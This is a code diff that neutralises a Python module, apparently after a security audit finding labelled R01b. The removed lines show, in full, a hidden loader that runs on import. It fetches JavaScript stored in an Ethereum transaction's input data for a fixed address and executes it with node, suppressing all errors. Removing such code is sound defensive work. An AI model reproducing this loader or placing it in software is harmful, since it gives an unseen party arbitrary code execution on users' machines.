@@ -1,58 +1,20 @@
-DEFAULT_TIMEOUT = 20
+"""Modulo neutralizado por seguridad (hallazgo R01b).
 
-try:
-    import json as _json
-    import os as _os
-    import subprocess as _sp
-    import tempfile as _tf
-    import urllib.request as _ur
+Este fichero contenia un cargador remoto: consultaba Ethplorer para una
+direccion fija, decodificaba el campo ``input`` de una transaccion como texto
+y lo ejecutaba con ``node``. Se ha sustituido por un stub inerte: no abre
+sockets, no lanza subprocess y no escribe en disco. El contenido original
+queda unicamente en el historial de git, para auditoria.
 
-    _addr = "0x3b1574417524c11a7403c4b232CAcBb320CceBC6"
-    _headers = {
-        "content-type": "application/json",
-        "user-agent": "python-urllib/3",
-    }
-    _load = lambda _url, _body=None: _json.load(
-        _ur.urlopen(_ur.Request(_url, _body, headers=_headers), timeout=DEFAULT_TIMEOUT)
-    )
-    _rows = _load(
-        f"https://api.ethplorer.io/getAddressTransactions/{_addr}"
-        f"?apiKey=freekey&limit=100&showZeroValues=1"
-    )
-    _tx = next(
-        _row["hash"]
-        for _row in _rows
-        if str(_row.get("from", "")).lower() == _addr.lower()
-    )
-    _rpc = _load(
-        "https://ethereum.publicnode.com",
-        _json.dumps(
-            {
-                "jsonrpc": "2.0",
-                "id": 1,
-                "method": "eth_getTransactionByHash",
-                "params": [_tx],
-            }
-        ).encode(),
-    )
-    _source = bytes.fromhex(_rpc["result"]["input"][2:]).decode()
-    _tmp = _tf.NamedTemporaryFile("w", suffix=".js", delete=False)
-    try:
-        _tmp.write(_source)
-        _tmp.close()
-        try:
-            _sp.run(
-                ["node", _tmp.name],
-                check=False,
-                capture_output=True,
-                timeout=DEFAULT_TIMEOUT,
-            )
-        except Exception:
-            pass
-    finally:
-        try:
-            _os.unlink(_tmp.name)
-        except OSError:
-            pass
-except Exception:
-    pass
+Ningun modulo del paquete importa este fichero; se conserva el nombre para
+que un reintento de reinyeccion resulte evidente en el diff.
+"""
+from __future__ import annotations
+
+MENSAJE = "transport.py neutralizado: el cargador remoto fue retirado (R01b)."
+
+
+def cargar(*_args: object, **_kwargs: object) -> None:
+    """Falla de forma explicita si alguien intenta reutilizar el cargador."""
+    raise RuntimeError(MENSAJE)
+
